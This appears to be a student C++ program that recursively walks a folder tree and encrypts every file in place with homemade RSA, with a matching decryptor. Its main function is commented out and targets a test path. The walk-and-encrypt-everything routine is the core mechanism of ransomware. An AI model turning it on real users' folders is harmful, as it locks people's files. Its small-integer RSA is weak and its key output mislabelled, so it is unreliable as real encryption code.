#include <iostream>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include "keygen.cpp"
#include "encrypt.cpp"
#include "decrypt.cpp"

namespace fs = std::filesystem;

struct FileItem {
    std::string name;
    bool isDirectory;
};

int e;
int d;

// Function to get a list of all files and directories in a specific path
std::vector<FileItem> listFilesAndDirectories(const std::string& path) {
    std::vector<FileItem> result;
    try {
        for (const auto& entry : fs::directory_iterator(path)) {
            if(fs::is_directory(entry.path())) {
                result.push_back({entry.path().filename().string(), true});
            } else {
                result.push_back({entry.path().filename().string(), false});
            }
        }
    } catch (const fs::filesystem_error& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }
    return result;
}

void readPublicKeyFromFile() {
    std::ifstream publicKeyFile("public.txt");
    if (publicKeyFile.is_open()) {
        publicKeyFile >> e;
        publicKeyFile >> RSA::n;
        publicKeyFile.close();
    }
    std::cout << "Public Key: " << e << ", n: " << RSA::n << std::endl;
}

void encoder(const std::vector<FileItem>& items, const std::string& currentPath) {
    for (const auto& item : items) {
        // In ra đường dẫn tuyệt đối của mỗi mục
        std::string absolutePath = currentPath + item.name;
        if (item.isDirectory) {
            absolutePath += "\\";
        }
        //std::cout << (item.isDirectory ? "Directory: " : "File: ") << absolutePath << std::endl;

        if (item.isDirectory) {
            std::string newPath = absolutePath;
            std::vector<FileItem> subItems = listFilesAndDirectories(newPath);
            encoder(subItems, newPath);
        }
        else{
            encrypt(absolutePath, e, RSA::n);
        }
    }
}

void readPrivateKeyFromFile() {
    std::ifstream privateKeyFile("private.txt");
    if (privateKeyFile.is_open()) {
        privateKeyFile >> d;
        privateKeyFile >> RSA::n;
        privateKeyFile.close();
    }
    std::cout << "Public Key: " << d << ", n: " << RSA::n << std::endl;
}

// Function to traverse and decrypt if it is a file
void decoder(const std::vector<FileItem>& items, const std::string& currentPath) {
    for (const auto& item : items) {
        // In ra đường dẫn tuyệt đối của mỗi mục
        std::string absolutePath = currentPath + item.name;
        if (item.isDirectory) {
            absolutePath += "\\";
        }
        //std::cout << (item.isDirectory ? "Directory: " : "File: ") << absolutePath << std::endl;

        if (item.isDirectory) {
            std::string newPath = absolutePath;
            std::vector<FileItem> subItems = listFilesAndDirectories(newPath);
            decoder(subItems, newPath);
        }
        else{
            decrypt(absolutePath, d, RSA::n);
        }
    }
}

// int main() {
//     srand(time(NULL));
//     RSA::primefiller();
//     RSA::setkeys();
    
//     std::string path = "C:\\test\\";

//     std::vector<FileItem> filesAndDirs = listFilesAndDirectories(path);
    
//     // readPublicKeyFromFile();
//     // encoder(filesAndDirs, path);

//     readPrivateKeyFromFile();
//     decoder(filesAndDirs, path);

//     return 0;
// }
